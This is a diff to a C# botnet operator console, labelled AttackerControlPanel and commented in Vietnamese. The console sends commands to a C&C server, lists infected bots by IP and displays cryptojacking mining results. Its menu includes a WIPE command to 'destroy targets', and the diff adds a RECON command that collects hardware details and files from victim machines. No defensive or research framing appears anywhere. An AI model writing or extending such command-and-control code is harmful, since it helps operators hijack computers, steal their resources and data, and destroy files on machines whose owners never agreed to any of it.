@@ -12,8 +12,8 @@ using System.Collections.Generic;
 
 public class BotInfo
 {
-    [JsonPropertyName("botId")]
-    public string BotId { get; set; } // Đây là IP của Bot
+    [JsonPropertyName("botIp")]
+    public string BotIp { get; set; } // Đây là IP của Bot
 
     [JsonPropertyName("lastSeen")]
     public DateTime LastSeen { get; set; }
@@ -24,8 +24,8 @@ public class BotInfo
 
 public class CryptoJackResult
 {
-    [JsonPropertyName("botId")]
-    public string BotId { get; set; }
+    [JsonPropertyName("botIp")]
+    public string BotIp { get; set; }
 
     [JsonPropertyName("nonce")]
     public long Nonce { get; set; }
@@ -45,6 +45,11 @@ public class AttackerControlPanel
     private static readonly string CncServerUrl = $"http://{CncServerIp}:8000";
 
     private static readonly HttpClient client = new HttpClient();
+
+    private static readonly JsonSerializerOptions _jsonOptions = new JsonSerializerOptions
+    {
+        PropertyNameCaseInsensitive = true // Bỏ qua lỗi chữ hoa/thường
+    };
 
     static async Task Main(string[] args)
     {
@@ -98,16 +103,20 @@ public class AttackerControlPanel
         Console.WriteLine(" [3] Command: WIPE (!!! DESTROY TARGETS !!!)");
         Console.ResetColor();
 
+        Console.ForegroundColor = ConsoleColor.Magenta;
+        Console.WriteLine(" [4] Command: RECON (Gather Hardware & Files)");
+        Console.ResetColor();
+
         Console.ForegroundColor = ConsoleColor.Yellow;
         Console.WriteLine("\n--- Monitoring ---");
         Console.ResetColor();
-        Console.WriteLine(" [4] List all active Bots");
-        Console.WriteLine(" [5] View collected Results");
+        Console.WriteLine(" [5] List all active Bots");
+        Console.WriteLine(" [6] View collected Results");
 
         Console.ForegroundColor = ConsoleColor.Yellow;
         Console.WriteLine("\n--- System ---");
         Console.ResetColor();
-        Console.WriteLine(" [6] Refresh Menu");
+        Console.WriteLine(" [7] Refresh Menu");
         Console.WriteLine(" [0] Exit Panel");
         Console.WriteLine();
     }
@@ -138,12 +147,19 @@ public class AttackerControlPanel
                 }
                 break;
             case "4":
-                await ListBots();
+                // === GỬI LỆNH RECON ===
+                await SendCommandToServer("recon");
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.WriteLine("NOTE: Recon reports will be saved as .txt files on the C&C Server folder.");
+                Console.ResetColor();
                 break;
             case "5":
-                await ViewResults();
+                await ListBots();
                 break;
             case "6":
+                await ViewResults();
+                break;
+            case "7":
                 // Refresh (không làm gì cả, vòng lặp sẽ tự vẽ lại menu)
                 return false;
             case "0":
@@ -196,7 +212,8 @@ public class AttackerControlPanel
         try
         {
             string jsonResponse = await client.GetStringAsync($"{CncServerUrl}/bot/list");
-            var bots = JsonSerializer.Deserialize<List<BotInfo>>(jsonResponse);
+            //var bots = JsonSerializer.Deserialize<List<BotInfo>>(jsonResponse);
+            var bots = JsonSerializer.Deserialize<List<BotInfo>>(jsonResponse, _jsonOptions);
 
             if (bots == null || bots.Count == 0)
             {
@@ -216,7 +233,7 @@ public class AttackerControlPanel
             foreach (var bot in bots)
             {
                 var timeAgo = DateTime.UtcNow - bot.LastSeen;
-                Console.WriteLine($"{bot.BotId,-38}{bot.LastSeen,-25:yyyy-MM-dd HH:mm:ss}{bot.Status} ({(int)timeAgo.TotalSeconds}s ago)");
+                Console.WriteLine($"{bot.BotIp,-38}{bot.LastSeen,-25:yyyy-MM-dd HH:mm:ss}{bot.Status} ({(int)timeAgo.TotalSeconds}s ago)");
             }
         }
         catch (Exception ex)
@@ -233,7 +250,7 @@ public class AttackerControlPanel
         try
         {
             string jsonResponse = await client.GetStringAsync($"{CncServerUrl}/bot/results");
-            var results = JsonSerializer.Deserialize<List<CryptoJackResult>>(jsonResponse);
+            var results = JsonSerializer.Deserialize<List<CryptoJackResult>>(jsonResponse, _jsonOptions);
 
             if (results == null || results.Count == 0)
             {
@@ -251,7 +268,7 @@ public class AttackerControlPanel
 
             foreach (var result in results)
             {
-                Console.WriteLine($"{result.Timestamp,-25:yyyy-MM-dd HH:mm:ss}{result.BotId,-38}{result.Nonce,-12}{result.Hash.Substring(0, 16)}...");
+                Console.WriteLine($"{result.Timestamp,-25:yyyy-MM-dd HH:mm:ss}{result.BotIp,-38}{result.Nonce,-12}{result.Hash.Substring(0, 16)}...");
             }
         }
         catch (Exception ex)
